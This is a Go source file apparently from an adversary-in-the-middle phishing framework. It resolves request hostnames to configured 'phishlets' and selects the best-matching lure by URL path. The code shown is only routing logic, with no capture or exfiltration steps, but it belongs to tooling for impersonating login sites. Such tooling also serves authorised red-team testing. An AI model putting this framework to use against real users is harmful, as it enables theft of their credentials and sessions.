package aitm

import (
	"fmt"
	"strings"
	"sync"
)

// PhishletResolver maps request hostnames to their phishlet and lure.
// All phishlet state is held in memory; lures are still queried from the store.
// Register must be called whenever a phishlet's rules or operator config changes.
type PhishletResolver struct {
	mu        sync.RWMutex
	phishlets map[string]*Phishlet // name → phishlet
	hostnames map[string]*Phishlet // lowercase hostname → phishlet (enabled only)
	lureStore LureStore
}

func NewPhishletResolver(lureStore LureStore) *PhishletResolver {
	return &PhishletResolver{
		phishlets: make(map[string]*Phishlet),
		hostnames: make(map[string]*Phishlet),
		lureStore: lureStore,
	}
}

// Register stores p in both indexes. If p is enabled and has a non-empty hostname
// it becomes reachable by hostname. Replaces any previously registered entry with
// the same name, cleaning up the old hostname index entry if the hostname changed.
func (r *PhishletResolver) Register(p *Phishlet) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if old, ok := r.phishlets[p.Name]; ok && old.Hostname != "" {
		delete(r.hostnames, strings.ToLower(old.Hostname))
	}

	r.phishlets[p.Name] = p
	if p.Enabled && p.Hostname != "" {
		r.hostnames[strings.ToLower(p.Hostname)] = p
	}
}

// Get returns the registered phishlet by name, or nil if not registered.
func (r *PhishletResolver) Get(name string) *Phishlet {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.phishlets[name]
}

// ContainsHostname reports whether hostname belongs to an active registered phishlet.
func (r *PhishletResolver) ContainsHostname(hostname string) bool {
	r.mu.RLock()
	defer r.mu.RUnlock()
	_, ok := r.hostnames[strings.ToLower(hostname)]
	return ok
}

// ResolveHostname returns the phishlet and best-matching lure for a request.
// When multiple lures share a phishlet, the longest path prefix wins.
func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
	r.mu.RLock()
	p, ok := r.hostnames[strings.ToLower(hostname)]
	r.mu.RUnlock()

	if !ok {
		return nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
	}

	lures, err := r.lureStore.ListLures()
	if err != nil {
		return nil, nil, fmt.Errorf("listing lures: %w", err)
	}

	var matched *Lure
	matchLen := -1
	for _, lure := range lures {
		if lure.Phishlet != p.Name {
			continue
		}
		if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
			if len(lure.Path) > matchLen {
				matched = lure
				matchLen = len(lure.Path)
			}
		}
	}

	return p, matched, nil
}
